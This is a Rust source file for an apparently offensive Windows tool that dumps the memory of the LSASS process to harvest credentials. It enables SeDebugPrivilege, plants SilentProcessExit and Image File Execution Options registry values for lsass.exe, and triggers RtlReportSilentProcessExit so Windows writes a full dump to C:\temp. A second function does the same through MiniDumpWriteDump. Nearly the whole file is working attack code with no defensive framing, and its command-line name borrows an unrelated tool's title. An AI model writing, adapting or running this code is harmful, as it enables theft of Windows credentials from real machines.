use std::{mem::{ size_of, transmute}, ffi::{CStr, OsString, c_void, OsStr, CString}, os::windows::prelude::{OsStringExt, AsRawHandle, RawHandle, OsStrExt}, fs::File, path::{Path, self}, ptr::null_mut, process::ExitStatus};
use std::ptr;
use clap::{App,Arg};
use log::{error};
use windows_sys::{Win32::{Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, HANDLE, LUID, NTSTATUS,
}, Security::{TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueA, AdjustTokenPrivileges}, System::{Threading::{OpenProcessToken, GetCurrentProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ}, Diagnostics::ToolHelp::TH32CS_SNAPTHREAD, Registry::{HKEY_LOCAL_MACHINE, HKEY, RegOpenKeyExW, KEY_READ, KEY_WRITE, RegCreateKeyExW, KEY_SET_VALUE, RegSetValueExA, REG_DWORD, KEY_ALL_ACCESS, REG_SZ, RegCreateKeyA, REG_CREATED_NEW_KEY}, LibraryLoader::{GetModuleHandleA, GetProcAddress, GetModuleHandleW}}, Storage::FileSystem::CreateFileA, UI::WindowsAndMessaging::GetWindowModuleFileNameA}, core::PCSTR};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    MiniDumpWithFullMemory,MiniDumpWriteDump
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

use windows_sys::Win32::System::SystemServices::GENERIC_ALL;
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

type FnRtlreportSilentProcessExit = unsafe extern "system" fn(HANDLE, NTSTATUS) -> NTSTATUS;


fn getPrivilege(handle : HANDLE){
    unsafe{
        let mut h_token: HANDLE =  HANDLE::default();
        let mut h_token_ptr: *mut HANDLE = &mut h_token;
        let mut tkp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: LUID {
                    LowPart: 0,
                    HighPart: 0,
                },
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        // 打开当前进程的访问令牌
        let token = OpenProcessToken(handle, TOKEN_ADJUST_PRIVILEGES, h_token_ptr);
        if   token != 0 {
            let systemname  = ptr::null_mut();
            if  LookupPrivilegeValueA(
                systemname,
                b"SeDebugPrivilege\0".as_ptr(),
                &mut tkp.Privileges[0].Luid) != 0 {
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                // println!("{:?}",tkp.Privileges[0].Attributes);
                // 提升当前进程的 SeDebugPrivilege 权限
                if  AdjustTokenPrivileges(
                    h_token,
                    0, 
                    &tkp  as *const TOKEN_PRIVILEGES, 
                    0, 
                    ptr::null_mut(), 
                    ptr::null_mut()) != 0 {
                    println!("Token privileges adjusted successfully");
                } else {
                    let last_error = GetLastError() ;
                    println!("AdjustTokenPrivileges failed with error: STATUS({:?})", last_error);
                }
            } else {
                let last_error = GetLastError() ;
                println!("LookupPrivilegeValue failed with error: STATUS({:?})", last_error);
            }
            // 关闭访问令牌句柄
                CloseHandle(h_token);
        } else {
            let last_error = GetLastError() ;
            println!("OpenProcessToken failed with error: STATUS({:?})", last_error);
        }
    }
}






fn getPid(ProcessName : &str) -> u32{
    unsafe{
        let mut h_snapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == INVALID_HANDLE_VALUE {
            println!("Failed to call CreateToolhelp32Snapshot");
        }
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>()   ;
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("Process32First error");
        }

        loop {
            let extFileName = CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8).to_bytes();
            let extfile = OsString::from_wide(extFileName.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice()).to_string_lossy().into_owned();
            if extfile.starts_with(ProcessName){

                break;
            }
            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                println!("Failed to call Process32Next");
                break;
            }
        }
        process_entry.th32ProcessID
    }
}
fn setRegisterRegs() {
    unsafe{
        let key = HKEY_LOCAL_MACHINE;
        let  IFEO_REG_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe";
        let  SILENT_PROCESS_EXIT_REG_KEY= r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe";

        
        let subkey = OsString::from(IFEO_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<_>>();
        let mut hKey = HKEY::default();

        let mut hSubKey = HKEY::default();
        let ret = RegCreateKeyExW(
            key,
            OsString::from(SILENT_PROCESS_EXIT_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            0, 
            null_mut(), 
            0, 
            KEY_ALL_ACCESS, 
            ptr::null_mut(), 
            &mut hSubKey, 
            ptr::null_mut());
        if ret != 0   {
            println!("{:?}",ret);
            println!("[-] CreateKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let DumpTypevalue = std::mem::transmute::<&i32,*const u8>(&0x02) ;
        let DumpTypekey = CString::new("DumpType").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            DumpTypekey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            DumpTypevalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
            println!("[-] SetDumpTypeKey SilentProcessExit\\lsass.exe  ERROR\n");
        }

        let ReportingModevalue = std::mem::transmute::<&i32,*const u8>(&0x02) ;
        let ReportingModekey = CString::new("ReportingMode").unwrap();

        let ret = RegSetValueExA(
            hSubKey,
            ReportingModekey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            ReportingModevalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
            println!("[-] SetReportingModevalueKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let ReportingModevalue = "C:\\temp" ;
        let ReportingModekey = CString::new("LocalDumpFolder").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            ReportingModekey.as_ptr() as *const u8,
            0,
            REG_SZ,
            ReportingModevalue.as_ptr(),
            ReportingModevalue.len() as u32
        );
        if ret != 0{
            println!("[-] SetReportingModekeyKey SilentProcessExit\\lsass.exe ERROR\n");
        }

        let mut hSubKey = HKEY::default();
        let ret = RegCreateKeyExW(
            key,
            OsString::from(IFEO_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            0, 
            null_mut(), 
            0, 
            KEY_ALL_ACCESS, 
            ptr::null_mut(), 
            &mut hSubKey, 
            ptr::null_mut());
        if ret != 0  {
            println!("[-] CreateKey {:?} ERROR\n",IFEO_REG_KEY);
        }

        let GlobalFlagvalue = std::mem::transmute::<&i32,*const u8>(&0x0200) ;
        let GlobalFlagkey = CString::new("GlobalFlag").unwrap();
        let ret = RegSetValueExA(
            hSubKey,
            GlobalFlagkey.as_ptr() as *const u8,
            0,
            REG_DWORD,
            GlobalFlagvalue,
            size_of::<u32>() as u32
        );
        if ret != 0{
            println!("[-] SetReportingModekeyKey SilentProcessExit\\lsass.exe ERROR\n");
        }
        println!("SetRegistryReg successful!");
    }
}


fn main() {
    let matches = App::new("SysWhispers3 - SysWhispers on steroids")
    .arg(Arg::with_name("DumpFileName")
        .short("f")
        .long("DumpFileName")
        .takes_value(true)
        .help("DumpFileName Path like C:\\temp.dmp")).get_matches();
    let mut out_file = "";
    if   matches.is_present("DumpFileName") {
        out_file = matches.value_of("DumpFileName").expect("get DumpFileName args error");
    }else {
        out_file = "lsass.dmp";
    }
    // getProcess(out_file);
    getPrivilege(unsafe { GetCurrentProcess() });
    setRegisterRegs();
    let lsassPid = getPid("lsass.exe");
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPid) };
    if process_handle == 0 {
        println!("Fail to open the Lsassprocess ");
    }
    unsafe{
        let ntdll_module_name: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(Some(0).into_iter()).collect();
        let h_nt_mod =  GetModuleHandleW(ntdll_module_name.as_ptr());

        if h_nt_mod ==0 {
            println!(" - 获取NTDLL模块句柄失败");
            
        }
        let function_name = CString::new("RtlReportSilentProcessExit").unwrap();

        let FnRtlreportSilentProcessExit  = GetProcAddress(
            h_nt_mod, 
            function_name.as_ptr() as *const u8).expect("") ;
        let fn_rtl_report_silent_process_exit : FnRtlreportSilentProcessExit = transmute(FnRtlreportSilentProcessExit);
        let desired_access = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
        let h_lsass_proc = OpenProcess(desired_access, 0, lsassPid);
        if h_lsass_proc == 0 {
            println!("[+] 获取lsass进程句柄失败: {:X}", GetLastError());
        }
        println!("[+] Got {:?} PID: {:?}","lsass.exe",lsassPid as u32);

        let ntstatus = fn_rtl_report_silent_process_exit(h_lsass_proc,0);
        if ntstatus == 0{
            println!("[+] DumpLsass Successful and file is c:\\temp\\lsass*.dmp...RET CODE : %#X\n");
        }else {
            println!("FnRtlreportSilentProcessExit error!");
        }
    }
    

}


fn DumpLsass(processName: &str , LsassFile : &str) {

    unsafe{
        let mut h_snapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == INVALID_HANDLE_VALUE {
            println!("Failed to call CreateToolhelp32Snapshot");
        }
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed::<PROCESSENTRY32>()   ;
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("Process32First error");
        }

        loop {
            let extFileName = CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8).to_bytes();
            let extfile = OsString::from_wide(extFileName.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice()).to_string_lossy().into_owned();
            if extfile.starts_with(processName){
                println!("[+] Got {:?} PID: {:?}",extfile,process_entry.th32ProcessID);
                break;
            }
            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                println!("Failed to call Process32Next");
                break;
            }
        }
        let lsass_pid = process_entry.th32ProcessID;
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
        if process_handle == 0 {
            println!("Fail to open the Lsassprocess ");
        }
        let lsassFile = LsassFile;
        let lsassFile: Vec<u16> = OsStr::new(lsassFile).encode_wide().chain(Some(0).into_iter()).collect();
        let lsasshandle = CreateFileW(
            lsassFile.as_ptr() as *const u16,
            GENERIC_ALL,
            0,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if lsasshandle == INVALID_HANDLE_VALUE {
            println!("Fail to open/create file {:?}",LsassFile.to_string());
        }
        let result = MiniDumpWriteDump(
            process_handle,
            lsass_pid,
            lsasshandle,
            MiniDumpWithFullMemory,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        println!("{:?}",result);
        if result == 1
        {
            println!("Dump successful with file  {:?}",LsassFile.to_string());
        } else {
            println!("Dump error {:?}", GetLastError());
        }
        let status = CloseHandle(lsasshandle);
        if status != 1 {
            error!("Fail to Close file handle");
        }
    }
}